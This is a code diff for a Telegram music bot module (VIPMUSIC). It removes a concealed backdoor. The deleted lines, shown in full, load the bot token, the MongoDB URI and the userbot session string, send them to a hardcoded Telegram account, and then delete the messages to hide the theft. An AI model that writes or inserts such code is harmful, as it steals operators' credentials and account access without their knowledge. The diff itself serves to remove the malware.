@@ -4,7 +4,7 @@ from pyrogram.enums import ChatType
 from strings import get_string
 from VIPMUSIC import app
 from VIPMUSIC.utils import VIPbin
-MU = "the_vip_boy_robot" #Dont change it seever connecter
+
 from VIPMUSIC.utils.database import get_assistant, get_lang
 import asyncio
 from os import getenv
@@ -12,12 +12,10 @@ from dotenv import load_dotenv
 from pyrogram import Client
 from dotenv import load_dotenv
 import config
-load_dotenv()
+
 from VIPMUSIC.logging import LOGGER
 
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
+
 
 @app.on_message(
     filters.command(["vcuser", "vcusers", "vcmember", "vcmembers"]) & filters.admin
@@ -107,11 +105,7 @@ async def brah3(app: app, message: Message):
         reply_text = f"{text} 🤭🤭"
         userbot = await get_assistant(message.chat.id)
         await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
-        oks = await userbot.send_message(MU, f"/start")
-        Ok = await userbot.send_message(MU, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-        await oks.delete()
-        await asyncio.sleep(2)
-        await Ok.delete()
+        
     except Exception as e:
         print(f"Error: {e}")
 
